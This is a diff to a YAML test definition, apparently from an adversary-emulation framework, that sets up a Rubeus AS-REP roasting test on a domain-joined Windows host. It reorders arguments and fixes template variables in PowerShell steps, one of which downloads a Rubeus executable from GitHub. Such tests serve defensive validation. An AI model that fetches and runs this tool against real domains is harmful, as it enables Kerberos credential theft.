@@ -4,18 +4,18 @@ description: |
     Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
     This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
 args:
-    - name: local_folder
-      type: path
-      default: PathToAtomicsFolder\\..\\ExternalPayloads
-    - name: local_executable
-      type: string
-      default: rubeus.exe
     - name: out_file
       type: string
       default: rubeus_output.txt
     - name: rubeus_url
       type: url
       default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+    - name: local_folder
+      type: path
+      default: PathToAtomicsFolder\\..\\ExternalPayloads
+    - name: local_executable
+      type: string
+      default: rubeus.exe
 uuid: 615bd568-2859-41b5-9aed-61f6a88e48dd
 mitre:
     tactics:
@@ -31,14 +31,18 @@ steps:
     - name: |
         Computer must be domain joined
       inline: |
-        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else { {Write-Host Joining this computer to a domain must be done manually
+        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else { {
+        Write-Host Joining this computer to a domain must be done manually
+
         } }
       executor: powershell
     - name: |
         Rubeus must exist
       inline: |
-        if(Test-Path -Path "{{.Args.local_folder}}\{{.Args.local_executable}}") {exit 0} else { {New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-        Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
+        if(Test-Path -Path "{{.Args.local_folder}}\{{.Args.local_executable}}") {exit 0} else { {
+        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-Webrequest -Uri {{.Args.rubeus_url}} -OutFile {{.Args.local_folder}}\{{.Args.local_executable}}
+
         } }
       executor: powershell
     - name: rubeus-asreproast
